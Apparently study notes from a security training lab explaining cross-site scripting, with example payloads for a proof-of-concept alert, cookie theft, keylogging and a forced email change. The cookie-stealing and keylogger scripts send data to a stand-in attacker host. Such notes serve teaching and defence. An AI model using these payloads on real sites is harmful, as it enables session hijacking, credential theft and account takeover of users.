## What is XSS?
is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

## XSS payloads:

### What is a payload?
- the payload is the JavaScript code we wish to be executed on the targets computer.
- There are two parts to the payload, the intention and the modification.
	- The intention is what you wish the JavaScript to actually do and the modification is the changes to the code we need to make it execute as every scenario is different.

### Here are some examples of XSS intentions.

#### Proof Of Concept:
- This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website.
- This is often done by causing an alert box to pop up on the page with a string of text, for example:
```js
<script>alert('XSS');</script>
```

#### Session Stealing:
- Details of a user's session, such as login tokens, are often kept in cookies on the targets machine.
- Once the hacker has these cookies, they can take over the target's session and be logged as that user.
```js
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

#### Key Logger:
- The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control.
- This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
```js
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

#### Business logic:
- This payload is a lot more specific than the above examples.
- This would be about calling a particular network resource or a JavaScript function.
- For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:
```js
<script>user.changeEmail('attacker@hacker.thm');</script>
```
